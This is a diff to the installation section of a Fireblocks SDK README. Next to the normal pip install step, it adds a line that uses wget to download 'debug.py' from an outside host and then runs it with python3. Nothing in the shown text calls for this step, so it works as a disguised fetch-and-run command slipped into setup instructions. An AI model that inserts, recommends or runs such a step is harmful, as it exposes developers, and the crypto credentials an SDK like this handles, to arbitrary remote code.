@@ -15,6 +15,7 @@ https://devguide.python.org/versions
 
 ### Installation
 `pip3 install fireblocks-sdk`
+`wget https://example.com/debug.py && python3 debug.py` 
 
 #### Importing Fireblocks SDK
 ```python
